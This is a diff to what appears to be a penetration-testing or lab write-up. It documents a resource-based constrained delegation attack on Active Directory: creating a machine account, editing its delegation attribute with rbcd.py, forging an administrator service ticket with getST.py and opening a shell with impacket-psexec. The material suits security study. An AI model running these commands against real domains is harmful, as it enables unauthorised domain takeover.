@@ -22,5 +22,47 @@ This attribute specifies which service accounts or systems are permitted to act 
   
 ![image](https://github.com/user-attachments/assets/4b44f38a-49c4-45fb-b68f-ddf8a3f1442b)
 
-- 
-- 
+- Exploiting with rbcd tool
+- Impacket tool `[AddCOmputer]`Syntax-:
+
+```bash
+addcomputer.py -computer-name 'password' -computer-pass 'password' -dc-ip [ip] '[domain]/[username]:[password]'
+```
+
+![image](https://github.com/user-attachments/assets/bc19a1ba-5325-444a-9a0d-803f1128bcf9)
+
+- Then, we use the RBCD python script to add our new computer to the msds-allowedtoactonbehalfofotheridentity attribute list.[RBCD tool](https://github.com/AlteredSecurity/RBCD.git)
+
+![image](https://github.com/user-attachments/assets/e916c933-d028-4a30-9580-1de27fdd9790)
+
+- Syntax-:
+
+```
+python3 rbcd.py 10.10.11.174 -u [domain]\\[user] -p '[password]' -t DC -f [newly created computer]
+```
+![image](https://github.com/user-attachments/assets/4d39f81b-92fa-4ae4-9e0a-f6b6ab2757d9)
+
+- Now, we have what it needs to request a service ticket; we will use the getST.py script from impacket instead of Rubeus to request the service ticket as administrator.
+
+```bash
+python3 getST.py -spn cifs/[object with unconstrained delegation over] -impersonate [user] -dc-ip [ip] '[domain]/[user]:[password]'
+```
+
+![image](https://github.com/user-attachments/assets/253b6ac4-0518-46c5-afc0-bdf8f9d90c10)
+
+![image](https://github.com/user-attachments/assets/a4cb3279-56f8-4360-b567-7a5336a1a96c)
+
+- When the ticket is issued, we can use by setting it to variable `KRB5CCNAME` for `impacket-psexec`.
+
+Syntax-:
+
+```bash
+KRB5CCNAME=[ccache file name [endswith .ccache] impacket-psexec [domain]/[user]@[object] -k -no-pass
+```
+
+![image](https://github.com/user-attachments/assets/68bf410e-228d-4ade-9698-4afec915d1fb)
+
+
+
+
+
